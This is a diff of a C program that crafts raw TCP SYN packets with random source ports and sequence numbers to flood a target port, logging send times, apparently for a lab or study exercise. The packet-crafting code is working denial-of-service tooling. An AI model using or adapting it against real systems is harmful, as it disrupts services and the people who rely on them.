@@ -24,9 +24,7 @@
 #define SEC_TO_MS 1000.0
 #define NSEC_TO_MS 1000000.0
 #define WINDOW_SIZE 5840
-#define PORTS 64500
 
- int ports[PORTS];
 
 /* 
     96 bit (12 bytes) pseudo header needed for tcp header checksum calculation 
@@ -58,21 +56,6 @@ unsigned short checksum(unsigned short *buf, int len) {
     return (unsigned short)~sum;
 }
 
-void setPorts() {
-    for (int i = 0; i < PORTS; i++) {
-        ports[i] = i+1024;
-    }
-}
-
-void shufflePorts() {
-    for (int i = 0; i < PORTS; i++) {
-        int j = rand() % PORTS;
-        int temp = ports[i];
-        ports[i] = ports[j];
-        ports[j] = temp;
-    }
-}
-
 void setIPHeader(struct iphdr *iph, struct sockaddr_in *sin) { // Function to set IP header
     iph->ihl = 5; // IP header length
     iph->version = 4; // IP version, IPv4
@@ -87,11 +70,11 @@ void setIPHeader(struct iphdr *iph, struct sockaddr_in *sin) { // Function to se
     iph->check = 0; // Checksum will be calculated later
 }
 
-void setTCPHeader(struct tcphdr *tcph,int index) { // Function to set TCP header
-    tcph->source = htons(ports[index%PORTS]); // Source port, random number
+void setTCPHeader(struct tcphdr *tcph) { // Function to set TCP header
+    tcph->source = htons(rand() % 65535); // Source port, random number
     tcph->dest = htons(TARGET_PORT); // Destination port
-    tcph->seq = 0;  // Sequence number
-    tcph->ack_seq = 0;  // Acknowledgement number
+    tcph->seq = htons(rand() % 65535);  // Sequence number
+    tcph->ack_seq = htons(rand() % 65535);  // Acknowledgement number
     tcph->doff = 5; // TCP header length
     tcph->fin = 0; // FIN flag
     tcph->syn = 1; // SYN flag - sets to 1 to establish a connection, and flood, all other flags are set to 0
@@ -119,7 +102,7 @@ void send_syn_packet(int sockfd, struct sockaddr_in *target_addr, int index, FIL
     setIPHeader(iph, target_addr); 
 
     // Set TCP header
-    setTCPHeader(tcph, index);
+    setTCPHeader(tcph);
 
     // Calculate IP checksum
     iph->check = checksum((unsigned short *) packet, iph->tot_len); 
@@ -162,13 +145,9 @@ void send_syn_packet(int sockfd, struct sockaddr_in *target_addr, int index, FIL
     fprintf(log_file, "%d %lf\n", index, time_diff);
 }
 
-
-
 int main() {
     int sockfd;
     struct sockaddr_in target_addr;
-    setPorts();
-    shufflePorts();
     FILE *log_file = fopen("syns_result_c.txt", "w");
 
     if (log_file == NULL) {
